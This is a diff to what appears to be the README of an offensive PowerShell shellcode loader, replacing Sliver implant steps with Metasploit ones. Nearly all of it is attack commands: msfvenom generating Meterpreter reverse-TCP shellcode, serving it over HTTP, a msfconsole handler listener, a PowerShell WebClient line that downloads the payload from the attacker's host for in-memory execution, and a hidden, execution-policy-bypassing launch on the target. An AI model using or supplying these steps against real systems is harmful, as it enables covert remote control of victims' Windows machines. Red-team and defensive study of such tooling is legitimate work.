@@ -21,7 +21,7 @@ python3 -m http.server 80
 
 **3. Start your listener:**
 ```bash
-sliver > mtls --lhost <IP> --lport 443
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
 ```
 
 **4. Deliver and execute on the target** from a PowerShell session:
@@ -41,11 +41,11 @@ powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ps-loader.ps1
 
 Executes raw shellcode in memory using only PowerShell reflection — no `Add-Type`, no P/Invoke declarations, no imported modules. Resolves `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject` entirely at runtime via `LookupFunc`.
 
-A full Sliver implant is multi-MB, so download it at runtime instead of pasting it inline:
+A full stageless Meterpreter payload is ~200KB, so download it at runtime instead of pasting it inline:
 
 **1. Generate the shellcode and host it:**
 ```bash
-sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o /tmp/sc.bin
 python3 -m http.server 80        # serve /tmp/sc.bin from this directory
 ```
 
@@ -54,11 +54,16 @@ python3 -m http.server 80        # serve /tmp/sc.bin from this directory
 [Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData('http://<IP>/sc.bin')
 ```
 
-For small shellcode (a stager), generate one with `msfvenom -p windows/x64/custom/reverse_winhttp ... -f ps1` and paste the output inline.
+For small shellcode, use a staged stager instead of the full implant — generate it
+directly with msfvenom and paste the `-f ps1` output inline:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f ps1
+```
 
 **3. Start your listener:**
 ```bash
-sliver > mtls --lhost <IP> --lport 443
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
 ```
 
 **4. Run on the target:**
